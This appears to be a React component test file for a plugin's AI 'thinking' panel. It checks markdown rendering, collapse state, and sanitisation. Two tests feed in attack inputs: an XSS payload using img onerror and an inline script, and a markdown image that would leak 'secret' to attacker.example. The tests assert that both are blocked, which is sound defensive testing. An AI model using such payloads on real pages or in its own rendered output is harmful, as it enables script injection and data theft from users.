import { afterEach, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";

vi.mock("@termix-ssh/plugin-sdk/frontend", async (original) => ({
  ...(await original<object>()),
  useTranslation: () => ({
    t: (key: string, options?: Record<string, unknown>) =>
      options ? `${key}:${Object.values(options).join(",")}` : key,
  }),
}));
import { AiThinking } from "../../src/frontend/AiThinking";

afterEach(cleanup);

const open = () =>
  fireEvent.click(screen.getByRole("button", { name: "assistant.thinking" }));

it("renders the thinking as markdown once opened", () => {
  const { container } = render(<AiThinking content="**Evaluating plugins**" />);
  open();

  expect(screen.getByText("Evaluating plugins").tagName).toBe("STRONG");
  expect(container.textContent).not.toContain("**");
});

it("never turns raw HTML into elements", () => {
  const { container } = render(
    <AiThinking content="<img src=x onerror=alert(1)><script>window.__x=1</script>" />,
  );
  open();

  expect(container.querySelector("img")).toBeNull();
  expect(container.querySelector("script")).toBeNull();
  expect((window as { __x?: number }).__x).toBeUndefined();
});

it("does not load markdown images", () => {
  const { container } = render(
    <AiThinking content="Before ![leak](https://attacker.example/c?d=secret) after" />,
  );
  open();

  expect(container.querySelector("img")).toBeNull();
  expect(container.textContent).toContain("Before");
});

it("is collapsed by default", () => {
  render(<AiThinking content="**Evaluating plugins**" />);

  const button = screen.getByRole("button", { name: "assistant.thinking" });
  expect(button.getAttribute("aria-expanded")).toBe("false");
  expect(screen.queryByText("Evaluating plugins")).toBeNull();
});
